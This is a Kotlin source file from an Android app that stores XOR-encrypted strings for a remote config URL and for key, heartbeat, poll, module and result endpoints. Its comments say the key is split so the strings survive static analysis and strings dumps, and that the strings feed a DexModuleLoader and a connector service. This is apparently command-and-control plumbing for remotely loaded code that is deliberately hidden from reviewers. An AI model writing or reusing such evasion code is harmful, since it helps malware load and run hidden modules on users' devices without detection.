package com.nexlink.bridge

/**
 * Obfuscated string store — semua literal sensitif disimpan sebagai
 * XOR-encrypted IntArray. Key di-split 4 bagian supaya tidak terbaca
 * saat static analysis / strings dump.
 *
 * Digunakan oleh RemoteConfig, DexModuleLoader, KeyFetcher, ConnectorService.
 * R8 akan obfuscate nama class & method ini di release build.
 */
internal object ObfStr {

    // Key displit 4 bagian
    private fun k1() = byteArrayOf(0x4B, 0x7A, 0x39)
    private fun k2() = byteArrayOf(0x21, 0x6D, 0x56)
    private fun k3() = byteArrayOf(0x23, 0x72, 0x58)
    private fun k4() = byteArrayOf(0x77, 0x32, 0x24)
    private fun key() = k1() + k2() + k3() + k4()

    private fun d(enc: IntArray): String {
        val k = key()
        return String(ByteArray(enc.size) { i -> (enc[i] xor k[i % k.size].toInt()).toByte() })
    }

    // ── RemoteConfig ──────────────────────────────────────────────────────────
    
    fun configUrl() = d(intArrayOf(
        35, 14, 77, 81, 30, 108, 12, 93, 42, 22, 69, 10, 44, 19, 77, 73,
        24, 52, 86, 1, 61, 5, 81, 75, 37, 14, 92, 79, 25, 120, 64, 29,
        53, 88, 121, 94, 63, 15, 77, 78, 31, 63, 66, 30, 97, 78, 29, 101,
        37, 30, 75, 78, 4, 50, 96, 29, 54, 3, 64, 75, 39, 85, 84, 64,
        4, 56, 12, 19, 54, 19, 64, 75, 34, 30, 20, 66, 2, 56, 69, 27,
        63, 89, 88, 87, 36, 20
    ))

    // ── KeyFetcher — key delivery endpoint ───────────────────────────────────
    
    fun apiKeyEndpoint() = d(intArrayOf(100, 27, 73, 72, 66, 34, 72))
    
    fun apiHeartbeat() = d(intArrayOf(
        100, 27, 73, 72, 66, 50, 70, 4, 49, 20, 87, 11,
        35, 31, 88, 83, 25, 52, 70, 19, 44
    ))
    
    fun apiPoll() = d(intArrayOf(
        100, 27, 73, 72, 66, 50, 70, 4, 49, 20, 87, 11,
        59, 21, 85, 77, 82, 50, 70, 4, 49, 20, 87, 109, 47, 71
    ))
    
    fun apiModule() = d(intArrayOf(100, 27, 73, 72, 66, 59, 76, 22, 45, 27, 87, 11))

    
    fun apiResult() = d(intArrayOf(100, 27, 73, 72, 66, 50, 70, 4, 49, 20, 87, 11, 57, 31, 74, 84, 1, 34))

    // ── SharedPreferences keys ────────────────────────────────────────────────
    fun prefsName()  = d(intArrayOf(42, 10, 73, 126, 30, 34, 66, 6, 61))      // app_state
    fun prefsKeyId() = d(intArrayOf(40, 19, 93))                                // cid

    // ── Status messages ───────────────────────────────────────────────────────
    fun msgOk()      = d(intArrayOf(4, 49))                                     // OK
    fun msgDenied()  = d(intArrayOf(27, 31, 75, 76, 4, 37, 80, 27, 55, 25,    // Permission denied
                          18, 64, 46, 20, 80, 68, 9))
}